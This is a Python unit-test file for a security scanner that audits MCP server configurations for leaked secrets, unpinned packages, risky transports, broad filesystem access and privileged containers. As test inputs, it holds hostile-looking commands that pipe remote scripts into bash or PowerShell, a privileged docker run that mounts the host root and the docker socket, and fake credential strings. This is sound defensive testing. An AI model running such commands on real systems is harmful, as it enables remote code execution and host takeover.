import json
import os
import stat
import tempfile
import unittest
from pathlib import Path

from mcp_guard.loader import load_config, strip_jsonc
from mcp_guard.models import Server, Severity
from mcp_guard.rules import check_file, scan_servers, split_npm_spec, split_py_spec

# Fake secrets are assembled at runtime so the repository itself never contains
# strings that look like real provider credentials.
FAKE_GITHUB = "gh" + "p_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
FAKE_AWS = "AK" + "IA" + "Z7QW3ERTY5UIOP2A"
FAKE_ANTHROPIC = "sk-" + "ant-" + "x9Yz8Wv7Ut6Sr5Qp4On3Ml2Kj1Ih0Gf"


def server(**kw) -> Server:
    kw.setdefault("name", "s")
    kw.setdefault("source", "/tmp/claude_desktop_config.json")
    kw.setdefault("raw", {})
    return Server(**kw)


def ids(findings):
    return sorted(f.rule_id for f in findings)


class TestLoader(unittest.TestCase):
    def _write(self, name, content):
        d = tempfile.mkdtemp()
        p = Path(d) / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        return p

    def test_claude_desktop_format(self):
        p = self._write("c.json", json.dumps({"mcpServers": {"a": {"command": "npx", "args": ["x"]}}}))
        _, servers = load_config(p)
        self.assertEqual(servers[0].name, "a")
        self.assertEqual(servers[0].command, "npx")

    def test_vscode_jsonc_with_comments_and_trailing_commas(self):
        p = self._write(".vscode/mcp.json", """{
          // comment with "quotes" and a url http://x
          "servers": { "a": { "type": "http", "url": "https://h/mcp", }, }, /* block */
        }""")
        _, servers = load_config(p)
        self.assertEqual(servers[0].url, "https://h/mcp")
        self.assertEqual(servers[0].transport, "http")

    def test_strip_jsonc_keeps_slashes_inside_strings(self):
        self.assertEqual(json.loads(strip_jsonc('{"u": "https://a//b", }')), {"u": "https://a//b"})

    def test_zed_and_vscode_settings_and_claude_projects(self):
        zed = self._write("z.json", json.dumps(
            {"context_servers": {"z": {"command": {"path": "uvx", "args": ["pkg"], "env": {"K": "v"}}}}}))
        _, s = load_config(zed)
        self.assertEqual((s[0].command, s[0].args, s[0].env), ("uvx", ["pkg"], {"K": "v"}))

        vs = self._write("settings.json", json.dumps({"mcp": {"servers": {"v": {"command": "node"}}}}))
        self.assertEqual(load_config(vs)[1][0].name, "v")

        cc = self._write(".claude.json", json.dumps(
            {"projects": {"/p": {"mcpServers": {"p1": {"command": "x"}}}}, "mcpServers": {"g": {"command": "y"}}}))
        self.assertEqual(sorted(s.name for s in load_config(cc)[1]), ["g", "p1"])


class TestSecrets(unittest.TestCase):
    def test_known_formats_in_env(self):
        for value in (FAKE_GITHUB, FAKE_AWS, FAKE_ANTHROPIC):
            f = scan_servers([server(env={"WHATEVER": value})])
            self.assertIn("MCP001", ids(f), value[:6])

    def test_generic_secret_by_name(self):
        f = scan_servers([server(env={"MY_API_KEY": "q8Zr2LwXv9Tn4Kp7Hs1Dm6Fy"})])
        self.assertEqual(ids(f), ["MCP001"])

    def test_placeholders_and_references_are_not_flagged(self):
        for value in ("${env:API_KEY}", "${input:token}", "$GITHUB_TOKEN", "<your-token-here>",
                      "your-api-key", "xxxxxxxxxxxxxxxx", "op://vault/item/field", "", "true"):
            f = scan_servers([server(env={"API_KEY": value})])
            self.assertEqual(ids(f), [], value)

    def test_low_entropy_or_non_secret_names_not_flagged(self):
        self.assertEqual(ids(scan_servers([server(env={"TOKEN_TYPE": "bearerbearer"})])), [])
        self.assertEqual(ids(scan_servers([server(env={"LOG_LEVEL": "q8Zr2LwXv9Tn4Kp7Hs1Dm6Fy"})])), [])

    def test_secret_in_args(self):
        f = scan_servers([server(command="node", args=["srv.js", "--api-key", "q8Zr2LwXv9Tn4Kp7Hs1Dm6Fy"])])
        self.assertEqual(ids(f), ["MCP002"])
        f = scan_servers([server(command="node", args=["--token=" + FAKE_GITHUB])])
        self.assertEqual(ids(f), ["MCP002"])

    def test_project_scoped_file_escalates_to_critical(self):
        f = scan_servers([server(source="/repo/.mcp.json", env={"K": FAKE_GITHUB})])
        self.assertEqual(f[0].severity, Severity.CRITICAL)

    def test_evidence_is_redacted(self):
        f = scan_servers([server(env={"K": FAKE_GITHUB})])
        self.assertNotIn(FAKE_GITHUB, f[0].evidence)
        self.assertNotIn(FAKE_GITHUB, f[0].message)


class TestPackages(unittest.TestCase):
    def test_spec_parsing(self):
        self.assertEqual(split_npm_spec("@scope/pkg@1.2.3"), ("@scope/pkg", "1.2.3"))
        self.assertEqual(split_npm_spec("@scope/pkg"), ("@scope/pkg", None))
        self.assertEqual(split_npm_spec("pkg@latest"), ("pkg", "latest"))
        self.assertEqual(split_py_spec("mcp-server-fetch==1.0.0"), ("mcp-server-fetch", "1.0.0", True))
        self.assertEqual(split_py_spec("pkg>=1.0")[2], False)

    def test_unpinned_npx_and_uvx(self):
        for cmd, args in (("npx", ["-y", "@acme/srv"]), ("npx", ["-y", "@acme/srv@latest"]),
                          ("npx", ["@acme/srv@^1.2.0"]), ("uvx", ["acme-srv"]),
                          ("uvx", ["--from", "acme-srv>=1", "acme"]), ("pnpm", ["dlx", "acme-srv"])):
            self.assertIn("MCP003", ids(scan_servers([server(command=cmd, args=args)])), (cmd, args))

    def test_pinned_is_clean(self):
        for cmd, args in (("npx", ["-y", "@acme/srv@1.4.2"]), ("uvx", ["acme-srv==1.4.2"]),
                          ("/usr/local/bin/npx", ["-y", "acme-srv@2.0.0"]),
                          ("pipx", ["run", "acme-srv==1.0.0"])):
            self.assertEqual(ids(scan_servers([server(command=cmd, args=args)])), [], (cmd, args))

    def test_windows_cmd_wrapper_is_unwrapped(self):
        f = scan_servers([server(command="cmd", args=["/c", "npx", "-y", "@acme/srv"])])
        self.assertEqual(ids(f), ["MCP003"])

    def test_git_and_github_shorthand(self):
        self.assertEqual(ids(scan_servers([server(command="uvx", args=["git+https://github.com/a/b"])])), ["MCP004"])
        self.assertEqual(ids(scan_servers([server(command="npx", args=["-y", "someone/repo"])])), ["MCP004"])
        sha = "a" * 40
        self.assertEqual(ids(scan_servers([server(command="uvx", args=[f"git+https://github.com/a/b@{sha}"])])), [])

    def test_typosquat_and_archived(self):
        f = scan_servers([server(command="npx", args=["-y", "@modelcontextprotocol/server-filesytem@1.0.0"])])
        self.assertEqual(ids(f), ["MCP012"])
        f = scan_servers([server(command="npx", args=["-y", "@modelcontextprotocol/server-github@1.0.0"])])
        self.assertEqual(ids(f), ["MCP013"])
        f = scan_servers([server(command="npx", args=["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "/proj"])])
        self.assertEqual(ids(f), [])


class TestTransportFilesystemShellContainer(unittest.TestCase):
    def test_plain_http_remote(self):
        self.assertEqual(ids(scan_servers([server(url="http://mcp.example.com/mcp")])), ["MCP005"])
        self.assertEqual(ids(scan_servers([server(url="ws://mcp.example.com/mcp")])), ["MCP005"])

    def test_loopback_http_and_https_ok(self):
        for url in ("http://localhost:3000/mcp", "http://127.0.0.1:8080/sse", "https://mcp.example.com/mcp"):
            self.assertEqual(ids(scan_servers([server(url=url)])), [], url)

    def test_credentials_in_url(self):
        self.assertEqual(ids(scan_servers([server(url="https://u:p4ss@h/mcp")])), ["MCP006"])
        self.assertEqual(ids(scan_servers([server(url="https://h/mcp?token=abcdef123456")])), ["MCP006"])
        self.assertEqual(ids(scan_servers([server(url="https://h/mcp?token=${TOKEN}")])), [])

    def test_filesystem_scope(self):
        f = scan_servers([server(command="node", args=["srv.js", "/"])])
        self.assertEqual((ids(f), f[0].severity), (["MCP007"], Severity.CRITICAL))
        for home in ("~", "/home/alice", "/Users/bob/", "C:\\Users\\carol", "$HOME"):
            self.assertEqual(ids(scan_servers([server(command="node", args=[home])])), ["MCP007"], home)
        self.assertEqual(ids(scan_servers([server(command="node", args=["/home/alice/project", "~/code"])])), [])
        self.assertEqual(ids(scan_servers([server(command="node", args=["--root=/"])])), ["MCP007"])

    def test_shell(self):
        f = scan_servers([server(command="bash", args=["-c", "curl -sL https://x/i.sh | bash"])])
        self.assertEqual(ids(f), ["MCP008"])
        f = scan_servers([server(command="powershell", args=["-Command", "iwr https://x/a.ps1 | iex"])])
        self.assertEqual(ids(f), ["MCP008"])
        f = scan_servers([server(command="sh", args=["-c", "node server.js"])])
        self.assertEqual(ids(f), ["MCP016"])

    def test_container_flags(self):
        f = scan_servers([server(command="docker", args=[
            "run", "-i", "--rm", "--privileged", "--network=host", "--pid", "host",
            "--cap-add", "SYS_ADMIN", "-v", "/var/run/docker.sock:/var/run/docker.sock",
            "-v", "/:/host", "img:1.0"])])
        self.assertEqual(ids(f).count("MCP009"), 6)
        self.assertNotIn("MCP010", ids(f))

    def test_container_home_mount_and_image_pinning(self):
        f = scan_servers([server(command="docker", args=["run", "-v", "~:/data", "img"])])
        self.assertEqual(ids(f), ["MCP007", "MCP010"])
        f = scan_servers([server(command="podman", args=["run", "-i", "ghcr.io/a/b:latest"])])
        self.assertEqual(ids(f), ["MCP010"])
        f = scan_servers([server(command="docker", args=["run", "-i", "-e", "API_KEY", "img@sha256:" + "0" * 64])])
        self.assertEqual(ids(f), [])

    def test_docker_env_secret(self):
        f = scan_servers([server(command="docker", args=["run", "-e", "API_KEY=q8Zr2LwXv9Tn4Kp7Hs1Dm6Fy", "img:1.0"])])
        self.assertEqual(ids(f), ["MCP002"])

    def test_registry_port_is_not_a_tag(self):
        f = scan_servers([server(command="docker", args=["run", "localhost:5000/img"])])
        self.assertEqual(ids(f), ["MCP010"])


class TestApprovalAndFileRules(unittest.TestCase):
    def test_auto_approve(self):
        f = scan_servers([server(raw={"autoApprove": ["read_file"]})])
        self.assertEqual((ids(f), f[0].severity), (["MCP011"], Severity.MEDIUM))
        f = scan_servers([server(raw={"alwaysAllow": ["*"]})])
        self.assertEqual(f[0].severity, Severity.HIGH)
        f = scan_servers([server(raw={"trust": True})])
        self.assertEqual(ids(f), ["MCP011"])
        self.assertEqual(ids(scan_servers([server(raw={"autoApprove": []})])), [])

    def test_enable_all_project_servers(self):
        f = list(check_file(Path("/x/settings.json"), {"enableAllProjectMcpServers": True}, [], []))
        self.assertEqual(ids(f), ["MCP015"])

    @unittest.skipUnless(os.name == "posix", "POSIX permissions only")
    def test_world_readable_secret_file(self):
        d = Path(tempfile.mkdtemp())
        p = d / "mcp.json"
        p.write_text(json.dumps({"mcpServers": {"a": {"command": "x", "env": {"K": FAKE_GITHUB}}}}))
        os.chmod(p, 0o644)
        data, servers = load_config(p)
        found = scan_servers(servers)
        self.assertIn("MCP014", ids(check_file(p, data, servers, found)))
        os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)
        self.assertNotIn("MCP014", ids(check_file(p, data, servers, found)))


if __name__ == "__main__":
    unittest.main()
